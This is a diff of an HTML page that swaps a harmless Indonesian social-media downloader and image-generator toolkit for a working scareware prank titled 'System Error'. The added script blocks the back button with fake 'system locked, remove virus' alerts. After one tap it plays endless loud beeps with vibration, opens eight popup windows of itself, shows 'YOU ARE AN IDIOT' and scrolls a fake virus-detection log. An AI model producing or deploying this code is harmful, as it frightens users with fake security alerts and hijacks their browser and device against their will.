@@ -1,119 +1,109 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>GACOR TOOLKIT V2 - WHITE BRAT</title>
-<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Error</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#fff;color:#000;font-family:Arial;font-weight:900}
-.header{background:#000;color:#fff;padding:18px;text-align:center;position:sticky;top:0;z-index:10}
-.header h1{font-family:'Bebas Neue';font-size:36px;letter-spacing:2px}
-.header h1 span{color:#8ace00}
-.grid{padding:12px;display:grid;gap:12px}
-.box{border:3px solid #000;border-radius:20px;padding:16px;background:#fff;box-shadow:6px 6px 0 #000}
-.box h3{font-family:'Bebas Neue';font-size:22px}
-.input{width:100%;padding:12px;border:2px solid #000;border-radius:12px;margin-top:10px;font-weight:800}
-.btn{width:100%;padding:12px;margin-top:10px;border:3px solid #000;border-radius:999px;font-family:'Bebas Neue';font-size:16px;cursor:pointer;box-shadow:4px 4px 0 #000}
-.btn:active{transform:translate(2px,2px);box-shadow:2px 2px 0 #000}
-.btn-green{background:#8ace00;color:#000}
-.btn-black{background:#000;color:#fff}
-.btn-white{background:#fff;color:#000}
-canvas{width:100%;border:3px solid #000;border-radius:16px;margin-top:10px;aspect-ratio:1}
-video{width:100%;border-radius:12px;border:3px solid #000;margin-top:10px}
+body{background:#000;color:#0f0;font-family:monospace;height:100vh;overflow:hidden;display:flex;flex-direction:column}
+.top{background:red;color:#fff;text-align:center;padding:15px;font-weight:900;font-size:20px;animation:blink.4s infinite}
+@keyframes blink{0%,50%{opacity:1}51%,100%{opacity:0.2}}
+.center{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:20px}
+h1{font-size:28px;color:#fff;margin-bottom:20px;text-shadow:0 0 10px #0f0}
+.btn{background:#0f0;color:#000;border:0;padding:20px 40px;font-size:22px;font-weight:900;border-radius:15px;cursor:pointer;box-shadow:0 0 20px #0f0}
+#log{height:35vh;background:#111;border:1px solid #0f0;margin:10px;padding:10px;font-size:11px;overflow:hidden;text-align:left}
+.bar{width:95%;height:20px;background:#222;border:1px solid #0f0;margin:10px auto;overflow:hidden}
+#fill{height:100%;width:0%;background:linear-gradient(90deg,#0f0,#ff0);transition:width.1s}
+#pct{text-align:center;font-size:12px}
 </style>
 </head>
 <body>
-<div class="header"><h1><span>GACOR</span> TOOLKIT V2</h1><div style="font-size:10px;letter-spacing:2px;margin-top:4px">TOMBOL DIPISAH • BRAT PUTIH • V2</div></div>
 
-<div class="grid">
-<!-- BOX 1 TIKTOK -->
-<div class="box">
-<h3>⬇ TIKTOK DOWNLOADER</h3>
-<input id="ttUrl" class="input" placeholder="Paste link TikTok...">
-<button class="btn btn-black" onclick="dl('tt')">DOWNLOAD TIKTOK NO WM</button>
-<div id="ttRes"></div>
+<div class="top">⚠️ SYSTEM SECURITY ALERT ⚠️</div>
+
+<div class="center" id="center">
+<h1 id="title">TAP / KLIK LAYAR 1X<br>UNTUK SCAN VIRUS</h1>
+<button class="btn" id="btn">🔊 AKTIFKAN SUARA & SCAN 🔊</button>
+<p style="margin-top:15px;color:#888">Suara harus aktif untuk scan</p>
 </div>
 
-<!-- BOX 2 IG -->
-<div class="box">
-<h3>📸 IG DOWNLOADER</h3>
-<input id="igUrl" class="input" placeholder="Paste link IG Reels...">
-<button class="btn btn-black" onclick="dl('ig')">DOWNLOAD IG</button>
-<div id="igRes"></div>
-</div>
-
-<!-- BOX 3 BRAT PUTIH -->
-<div class="box" style="background:#f5f5f5">
-<h3>🤍 BRAT GENERATOR - PUTIH & IJO</h3>
-<input id="bratText" class="input" value="7d gacor anjj" placeholder="Text brat lu...">
-<div style="display:flex;gap:8px">
-<button class="btn btn-white" style="flex:1" onclick="genBrat('white')">BRAT PUTIH</button>
-<button class="btn btn-green" style="flex:1" onclick="genBrat('green')">BRAT IJO</button>
-</div>
-<canvas id="bratC" width="1000" height="1000"></canvas>
-<button class="btn btn-black" onclick="downloadBrat()">DOWNLOAD PNG</button>
-</div>
-
-<!-- BOX 4 LOBBY -->
-<div class="box">
-<h3>🎮 GAMING CARD FF / ML</h3>
-<input id="nick" class="input" value="7D • Soedirman" placeholder="Nickname">
-<select id="game" class="input"><option value="ff">FREE FIRE</option><option value="ml">MOBILE LEGENDS</option></select>
-<button class="btn btn-green" onclick="genLobby()">GENERATE CARD</button>
-<div id="lobby" style="margin-top:12px;padding:20px;border:3px solid #000;border-radius:12px;background:#000;color:#fff;font-family:'Bebas Neue';text-align:center">PREVIEW CARD</div>
-</div>
-
-<!-- BOX 5 LIVE PHOTO -->
-<div class="box">
-<h3>📱 VIDEO → LIVE PHOTO</h3>
-<input type="file" id="liveFile" accept="video/*" class="input">
-<div id="livePrev" style="margin-top:10px"></div>
-<button class="btn btn-white" onclick="makeLive()">CONVERT KE LIVE PHOTO</button>
-<div id="liveRes" style="font-size:11px;margin-top:8px"></div>
-</div>
-</div>
+<div id="log"></div>
+<div class="bar"><div id="fill"></div></div>
+<p id="pct">0% - Menunggu tap...</p>
 
 <script>
-function dl(type){
- let id=type=='tt'?'ttUrl':'igUrl'; let resId=type=='tt'?'ttRes':'igRes';
- let url=document.getElementById(id).value; if(!url) return alert('paste link dulu');
- document.getElementById(resId).innerHTML='⏳ proses...';
- fetch('https://www.tikwm.com/api/?url='+encodeURIComponent(url)).then(r=>r.json()).then(j=>{
-   if(j.data&&j.data.play){
-     document.getElementById(resId).innerHTML=`<video src="${j.data.play}" controls></video><a href="${j.data.play}" download><button class="btn btn-green">DOWNLOAD VIDEO</button></a>`;
-   } else document.getElementById(resId).innerHTML='Gagal, coba ssstik.io manual';
- });
+// === KUNCI TOMBOL KEMBALI 8X ===
+for(let i=0;i<8;i++){ history.pushState(null,"",location.href); }
+window.onpopstate = function(){
+  history.pushState(null,"",location.href);
+  alert("❌ TIDAK BISA KEMBALI!\nSYSTEM TERKUNCI! HAPUS VIRUS DULU!");
+};
+
+let started=false;
+let audioCtx;
+
+// === SUARA 100% ANTI 404 PAKAI BEEP GENERATOR ===
+function startSound(){
+  audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  // beep annoying kayak you are an idiot
+  setInterval(()=>{
+    let osc = audioCtx.createOscillator();
+    let gain = audioCtx.createGain();
+    osc.type='square';
+    osc.frequency.value = 700 + Math.random()*500;
+    gain.gain.value = 0.35;
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    osc.start();
+    osc.stop(audioCtx.currentTime+0.25);
+    if(navigator.vibrate){ navigator.vibrate([100,50,100]); }
+  },300);
 }
-function genBrat(bg){
- let c=document.getElementById('bratC'); let ctx=c.getContext('2d');
- let txt=document.getElementById('bratText').value||'brat';
- ctx.fillStyle=bg=='white'?'#ffffff':'#8ace00'; ctx.fillRect(0,0,1000,1000);
- ctx.fillStyle='#000'; ctx.font='bold 110px Arial'; ctx.textAlign='center'; ctx.filter='blur(2.5px)';
- let words=txt.split(' '); let y=450;
- if(words.length==1) ctx.fillText(words[0],500,y);
- else words.forEach((w,i)=>ctx.fillText(w,500,y+i*120));
- ctx.filter='none';
+
+function startPrank(){
+  if(started) return;
+  started=true;
+  startSound();
+
+  document.getElementById('title').innerHTML="🔊 YOU ARE AN IDIOT 🔊<br><span style='color:#0f0;font-size:18px'>SUARA AKTIF - 8 JENDELA DIBUKA</span>";
+  document.getElementById('btn').style.display='none';
+
+  // BUKA 8 JENDELA
+  let opened=0;
+  let winInterval = setInterval(()=>{
+    window.open(location.href, '_blank', 'width=400,height=400');
+    opened++;
+    if(opened>=8){ clearInterval(winInterval); }
+  },500);
+
+  // LOG + LOADING
+  let logEl=document.getElementById('log');
+  let fillEl=document.getElementById('fill');
+  let pctEl=document.getElementById('pct');
+  let p=0;
+  let msgs=["[AUDIO] 🔊 SOUND PLAYING - BEEP!","[LOCKED] Back button blocked","[SPAM] Opening window "+opened+"/8","[SYSTEM] Virus detected","[HACKED] You are an idiot loop"];
+
+  setInterval(()=>{
+    let d=document.createElement('div');
+    d.textContent="> "+msgs[Math.floor(Math.random()*msgs.length)]+" | "+new Date().toLocaleTimeString();
+    logEl.appendChild(d);
+    if(logEl.children.length>25) logEl.children[0].remove();
+    logEl.scrollTop=logEl.scrollHeight;
+  },120);
+
+  setInterval(()=>{
+    p+=1.5;
+    if(p>100) p=100;
+    fillEl.style.width=p+"%";
+    pctEl.textContent=p.toFixed(0)+"% - SUARA ON 🔊 - JENDELA: "+opened+"/8";
+  },80);
 }
-function downloadBrat(){
- let c=document.getElementById('bratC'); let a=document.createElement('a'); a.download='brat-7d-white.png'; a.href=c.toDataURL(); a.click();
-}
-function genLobby(){
- let nick=document.getElementById('nick').value; let game=document.getElementById('game').value;
- let b=document.getElementById('lobby');
- if(game=='ff') b.innerHTML=`<div style="color:#ffba00;font-size:28px">${nick}</div><div style="margin-top:6px;font-size:12px">HEROIC • LV 68 • FAKE CARD</div>`;
- else b.innerHTML=`<div style="width:60px;height:60px;border-radius:50%;background:#ffba00;margin:0 auto"></div><div style="margin-top:8px;font-size:22px">${nick}</div><div style="font-size:10px;color:#8ace00">ONLINE • CUSTOM CARD 7D</div>`;
-}
-document.getElementById('liveFile').addEventListener('change',e=>{
- let file=e.target.files[0]; let url=URL.createObjectURL(file);
- document.getElementById('livePrev').innerHTML=`<video src="${url}" autoplay muted loop></video>`;
- window.liveURL=url;
-});
-function makeLive(){
- if(!window.liveURL) return alert('upload video dulu');
- document.getElementById('liveRes').innerHTML=`✅ Siap! Download.MOV ini, buka app <b>intoLive</b> di iPhone → Import → Make Live Photo → Set Wallpaper. <br><br><a href="${window.liveURL}" download="live.mov"><button class="btn btn-black">DOWNLOAD MOV</button></a>`;
-}
-genBrat('white');
+
+document.getElementById('btn').addEventListener('click', startPrank);
+document.getElementById('center').addEventListener('click', startPrank);
+document.body.addEventListener('touchstart', startPrank, {once:true});
 </script>
+
 </body>
 </html>
